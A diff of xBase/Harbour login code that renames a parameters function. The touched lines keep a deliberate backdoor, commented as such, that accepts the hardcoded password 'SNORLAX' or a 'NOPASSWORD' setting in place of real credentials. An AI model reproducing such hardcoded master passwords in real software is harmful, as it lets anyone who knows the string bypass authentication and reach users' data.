@@ -2545,7 +2545,7 @@ FUNCTION lChkUser( cGetNbr, cGetPas, oBtn )
 
          // Puertas traseras---------------------------------------------------
 
-         if !( ( Upper( Rtrim( cGetPas ) ) == "SNORLAX" ) .or. ( "NOPASSWORD" $ cParamsMain() ) ) 
+         if !( ( Upper( Rtrim( cGetPas ) ) == "SNORLAX" ) .or. ( "NOPASSWORD" $ appParamsMain() ) ) 
 
          // Comprobamos las claves---------------------------------------------
 
@@ -3188,7 +3188,7 @@ Return ( lSetUsr )
 
 Static Function lValidPassword( cClave, cCampo )
 
-Return ( Upper( Rtrim( cClave ) ) == Upper( Rtrim( cCampo ) ) .or. Upper( Rtrim( cClave ) ) == Upper( "snorlax" ) .or. ( "NOPASSWORD" $ cParamsMain() ) )
+Return ( Upper( Rtrim( cClave ) ) == Upper( Rtrim( cCampo ) ) .or. Upper( Rtrim( cClave ) ) == Upper( "snorlax" ) .or. ( "NOPASSWORD" $ appParamsMain() ) )
 
 //---------------------------------------------------------------------------//
 
